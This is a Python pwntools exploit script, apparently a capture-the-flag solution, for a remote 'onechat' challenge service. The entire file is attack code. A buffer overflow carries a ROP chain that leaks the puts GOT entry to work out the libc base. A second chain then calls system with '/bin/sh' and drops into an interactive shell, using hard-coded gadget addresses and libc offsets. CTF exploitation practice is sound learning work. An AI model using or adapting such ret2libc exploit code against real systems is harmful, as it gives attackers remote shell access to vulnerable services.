from os import system
from pwn import *
import time

# context.log_level = 'debug'

puts_got = 0x404028
puts_plt = 0x401050
pop_rdi = 0x4017bb
pop4ret = 0x4017b4
one = 0xccc1a
main = 0x4012e5
puts_off = 0x7e6f0
system_off = 0x4fa40
binsh = 0x1c126a
ret = 0x401754

# p = process('./task/chat')
# p = remote('localhost', 1337)
p = remote('onechat.ctfz.one', 1337)
p.recvuntil('> ')

ex = 'B'*22 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ret) + p64(main) + 'A'*64 + p64(pop4ret) + p64(puts_got) + p64(puts_plt) + p64(main) #10

p.sendline('2')
p.recvuntil('> ')
p.sendline('')
p.recvuntil('> ')
p.sendline(ex)

libc = int(p.recvline().strip()[::-1].encode('hex'), 16) - puts_off
# print(hex(libc))

p.recvuntil('> ')

p.sendline('')
p.recvuntil('> ')
# p.sendline('B'*22 + p64(pop_rdi) + p64(libc+binsh) + p64(libc+system_off) + p64(ret) + p64(main) + 'A'*64 + p64(pop4ret) + p64(puts_got) + p64(puts_plt) + p64(main))
p.sendline('A'*126+p64(ret)+p64(pop_rdi)+p64(binsh+libc)+p64(libc+system_off))


p.interactive()
